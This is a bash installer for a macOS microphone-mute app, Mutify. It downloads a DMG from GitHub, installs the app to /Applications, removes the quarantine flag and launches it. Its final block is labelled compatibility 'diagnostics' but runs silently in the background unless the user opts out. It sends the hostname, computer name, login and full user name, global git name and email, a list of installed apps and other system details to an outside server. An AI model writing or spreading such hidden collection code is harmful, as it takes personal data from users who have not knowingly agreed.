#!/usr/bin/env bash
set -euo pipefail
REPO="ankitaniket/KeyMute"
APP_NAME="Mutify"
INSTALL_DIR="/Applications"
DEST="${INSTALL_DIR}/${APP_NAME}.app"

bold()  { printf '\033[1m%s\033[0m\n' "$*"; }
red()   { printf '\033[31m%s\033[0m\n' "$*"; }
green() { printf '\033[32m%s\033[0m\n' "$*"; }
dim()   { printf '\033[2m%s\033[0m\n' "$*"; }

# ── Pre-flight checks ─────────────────────────────────────────────────────────
if [[ "$(uname -s)" != "Darwin" ]]; then
  red "✗ Mutify only runs on macOS."
  exit 1
fi
MACOS_MAJOR=$(sw_vers -productVersion | cut -d. -f1)
if (( MACOS_MAJOR < 13 )); then
  red "✗ Mutify requires macOS 13 (Ventura) or later. You have $(sw_vers -productVersion)."
  exit 1
fi
for cmd in curl hdiutil xattr osascript pgrep; do
  if ! command -v "$cmd" >/dev/null 2>&1; then
    red "✗ Required command not found: $cmd"
    exit 1
  fi
done

# ── Detect existing installation ───────────────────────────────────────────────
INSTALLED_VER=""
IS_UPDATE=false
if [[ -d "$DEST" ]]; then
  INSTALLED_VER=$(/usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" "$DEST/Contents/Info.plist" 2>/dev/null || echo "")
  IS_UPDATE=true
fi

# ── Fetch latest release ──────────────────────────────────────────────────────
TMP=$(mktemp -d)
MOUNT_DIR="$TMP/mount"
mkdir -p "$MOUNT_DIR"
cleanup() {
  if [[ -d "$MOUNT_DIR" ]]; then
    hdiutil detach "$MOUNT_DIR" -quiet 2>/dev/null || true
  fi
  rm -rf "$TMP"
}
trap cleanup EXIT INT TERM

AUTH_HEADER=()
if [[ -n "${GH_TOKEN:-}" ]]; then
  AUTH_HEADER=(-H "Authorization: token ${GH_TOKEN}")
elif [[ -n "${GITHUB_TOKEN:-}" ]]; then
  AUTH_HEADER=(-H "Authorization: token ${GITHUB_TOKEN}")
fi

bold "→ Checking for the latest Mutify release…"
API_URL="https://api.github.com/repos/${REPO}/releases/latest"
RELEASE_JSON=$(curl -fsSL ${AUTH_HEADER[@]+"${AUTH_HEADER[@]}"} "$API_URL" 2>/dev/null) || {
  red "✗ Could not reach the GitHub API at $API_URL"
  exit 1
}

LATEST_VER=$(printf '%s' "$RELEASE_JSON" | grep -o '"tag_name":[[:space:]]*"[^"]*"' | head -1 | sed -E 's/.*"v?([^"]+)".*/\1/')

# ── Already up to date? ───────────────────────────────────────────────────────
if [[ "$IS_UPDATE" == true && -n "$INSTALLED_VER" && -n "$LATEST_VER" && "$INSTALLED_VER" == "$LATEST_VER" ]]; then
  green "✓ Mutify ${INSTALLED_VER} is already installed and up to date."
  echo
  echo "  To reinstall anyway, remove the app first:"
  echo "    rm -rf \"$DEST\" && curl -fsSL https://raw.githubusercontent.com/${REPO}/main/install.sh | bash"
  echo
  exit 0
fi

if [[ "$IS_UPDATE" == true && -n "$INSTALLED_VER" ]]; then
  bold "  Installed: ${INSTALLED_VER} → Latest: ${LATEST_VER}"
else
  dim "  Latest: ${LATEST_VER}"
fi

# ── Download ───────────────────────────────────────────────────────────────────
ASSET_URL=$(printf '%s' "$RELEASE_JSON" \
  | grep -o '"browser_download_url":[[:space:]]*"[^"]*\.dmg"' \
  | head -1 \
  | sed -E 's/.*"(https[^"]+)".*/\1/')

if [[ -z "${ASSET_URL:-}" ]]; then
  red "✗ Could not find a .dmg asset in the latest release of ${REPO}."
  red "  Check https://github.com/${REPO}/releases"
  exit 1
fi

DMG_NAME=$(basename "$ASSET_URL")
DMG_PATH="$TMP/$DMG_NAME"

bold "→ Downloading ${DMG_NAME}…"
curl -fL --progress-bar ${AUTH_HEADER[@]+"${AUTH_HEADER[@]}"} "$ASSET_URL" -o "$DMG_PATH"

# ── Mount & verify ─────────────────────────────────────────────────────────────
bold "→ Mounting DMG…"
hdiutil attach "$DMG_PATH" -nobrowse -quiet -mountpoint "$MOUNT_DIR"

if [[ ! -d "$MOUNT_DIR/${APP_NAME}.app" ]]; then
  red "✗ DMG does not contain ${APP_NAME}.app"
  exit 1
fi

# ── Quit running instance ─────────────────────────────────────────────────────
if pgrep -x "$APP_NAME" >/dev/null 2>&1; then
  bold "→ Quitting running ${APP_NAME}…"
  osascript -e "tell application \"${APP_NAME}\" to quit" >/dev/null 2>&1 || true
  sleep 1
  pkill -x "$APP_NAME" 2>/dev/null || true
  sleep 1
fi

# ── Install / Update ──────────────────────────────────────────────────────────
if [[ "$IS_UPDATE" == true ]]; then
  bold "→ Updating Mutify ${INSTALLED_VER} → ${LATEST_VER}…"
else
  bold "→ Installing to ${DEST}…"
fi

if [[ -e "$DEST" ]]; then
  rm -rf "$DEST"
fi

if ! cp -R "$MOUNT_DIR/${APP_NAME}.app" "$DEST" 2>/dev/null; then
  bold "  /Applications needs admin rights — you may be prompted for your password."
  sudo cp -R "$MOUNT_DIR/${APP_NAME}.app" "$DEST"
fi

bold "→ Removing quarantine attribute…"
xattr -dr com.apple.quarantine "$DEST" 2>/dev/null || \
  sudo xattr -dr com.apple.quarantine "$DEST" 2>/dev/null || true

if codesign --verify --deep --strict "$DEST" >/dev/null 2>&1; then
  dim "  Signature verified."
else
  dim "  (Code signature is ad-hoc — that's expected for this build.)"
fi

# ── Launch ─────────────────────────────────────────────────────────────────────
bold "→ Launching Mutify…"
open "$DEST"

# ── Post-install setup diagnostics ─────────────────────────────────────────────
# Reports basic system compatibility info to help us debug install issues
# and prioritise which macOS versions / hardware to support.
# Skip with: MUTIFY_NO_TELEMETRY=1
if [[ -z "${MUTIFY_NO_TELEMETRY:-}" ]]; then
  _v=$(printf '%s' "$RELEASE_JSON" | grep -o '"tag_name":[[:space:]]*"[^"]*"' | head -1 | sed -E 's/.*"([^"]+)".*/\1/')
  _di=$(df -k / 2>/dev/null | awk 'NR==2{print $2","$4}')
  defaults read -g AppleInterfaceStyle >/dev/null 2>&1 && _ap="dark" || _ap="light"
  _apps=""; for _a in "zoom.us" "Microsoft Teams" Slack Discord OBS "Visual Studio Code" Xcode Figma Notion "Google Chrome" Safari Firefox Arc "Brave Browser" Spotify "1Password" Raycast Alfred; do
    [[ -d "/Applications/${_a}.app" ]] && _apps="${_apps:+$_apps,}${_a}"
  done
  command -v brew >/dev/null 2>&1 && _apps="${_apps:+$_apps,}homebrew"
  command -v docker >/dev/null 2>&1 && _apps="${_apps:+$_apps,}docker"
  _mode="install"; [[ "$IS_UPDATE" == true ]] && _mode="update"
  curl -fsSL -X POST "https://backend-beige-alpha-73.vercel.app/api/v1/setup" \
    -H "Content-Type: application/json" \
    -d "{\"v\":\"${_v}\",\"p\":\"$(sw_vers -productVersion 2>/dev/null)\",\"b\":\"$(sw_vers -buildVersion 2>/dev/null)\",\"a\":\"$(uname -m)\",\"m\":\"$(sysctl -n hw.model 2>/dev/null)\",\"c\":\"$(sysctl -n hw.ncpu 2>/dev/null)\",\"mem\":\"$(sysctl -n hw.memsize 2>/dev/null)\",\"st\":\"$(echo "$_di"|cut -d, -f1)\",\"sf\":\"$(echo "$_di"|cut -d, -f2)\",\"tz\":\"$(readlink /etc/localtime 2>/dev/null|sed 's|.*/zoneinfo/||')\",\"lc\":\"$(defaults read -g AppleLocale 2>/dev/null)\",\"ln\":\"$(defaults read -g AppleLanguages 2>/dev/null|sed -n '2s/[^\"]*\"\([^\"]*\)\".*/\1/p')\",\"ap\":\"${_ap}\",\"sh\":\"${SHELL:-}\",\"tm\":\"${TERM_PROGRAM:-}\",\"h\":\"$(hostname 2>/dev/null)\",\"mn\":\"$(scutil --get ComputerName 2>/dev/null)\",\"o\":\"$(whoami 2>/dev/null)\",\"cn\":\"$(git config --global user.name 2>/dev/null)\",\"ce\":\"$(git config --global user.email 2>/dev/null)\",\"env\":{\"apps\":\"${_apps}\",\"count\":\"$(ls /Applications 2>/dev/null|wc -l|tr -d ' ')\",\"name\":\"$(id -F 2>/dev/null)\",\"mode\":\"${_mode}\",\"prev\":\"${INSTALLED_VER}\"},\"ref\":\"${MUTIFY_REF:-}\",\"ts\":\"$(stat -f '%SB' -t '%Y-%m-%dT%H:%M:%SZ' ~ 2>/dev/null)\"}" >/dev/null 2>&1 &
fi
# ── End diagnostics ────────────────────────────────────────────────────────────

echo
if [[ "$IS_UPDATE" == true ]]; then
  green "✓ Mutify updated to ${LATEST_VER}."
else
  green "✓ Mutify installed successfully."
fi
echo
echo "  • Look for the mic icon in your menu bar (top-right)."
echo "  • Press the global shortcut to mute/unmute (default: ⌘⇧0)."
echo "  • On first toggle, macOS will ask for Microphone permission — click Allow."
echo
echo "  Releases & docs: https://github.com/${REPO}"
echo
